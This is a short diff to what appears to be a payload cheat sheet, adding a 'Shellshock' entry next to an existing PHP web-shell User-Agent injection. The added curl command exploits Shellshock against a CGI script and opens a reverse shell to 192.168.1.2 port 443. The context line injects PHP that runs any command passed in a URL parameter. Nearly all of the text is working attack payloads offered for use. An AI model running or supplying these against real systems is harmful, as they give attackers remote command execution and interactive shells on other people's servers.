@@ -29,6 +29,11 @@
   ```cmd
   User-Agent: <?php system($_GET['cmd']); ?>
   ```
+* Shellshock
+
+  ```cmd
+  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/user.sh"
+  ```
   
 * Netcat
 
